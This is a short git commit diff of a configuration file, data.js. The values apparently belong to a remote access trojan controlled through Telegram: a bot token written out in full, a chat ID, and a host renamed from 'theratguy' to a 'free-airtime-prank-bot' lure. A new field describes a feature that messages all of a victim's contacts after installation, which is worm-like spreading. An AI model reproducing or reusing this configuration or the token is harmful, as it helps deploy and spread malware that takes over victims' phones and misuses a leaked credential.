5392c36b666ba46420ddd9c2cd6709fd85709dad
Ramy Phoenix <recoveryfreenethub@gmail.com>
2025-05-27 13:37:00 +0200

    Update data.js

--- data.js
+++ data.js
@@ -1,5 +1,6 @@
-module.exports = {
-  token: "7978337411:AAFXCxiL6pdPBGzoakjUKuF4k8hEI61bi8Y",
-  id:"5962658076",
-  address:"https://theratguy.onrender.com"
-};
+{
+    "token": "7978337411:AAFXCxiL6pdPBGzoakjUKuF4k8hEI61bi8Y",
+    "id": "5962658076",
+    "host": "https://free-airtime-prank-bot.onrender.com",
+    "text": "dont write anything here it works only in premium version this feature send  this line on all contacts after installation"
+}
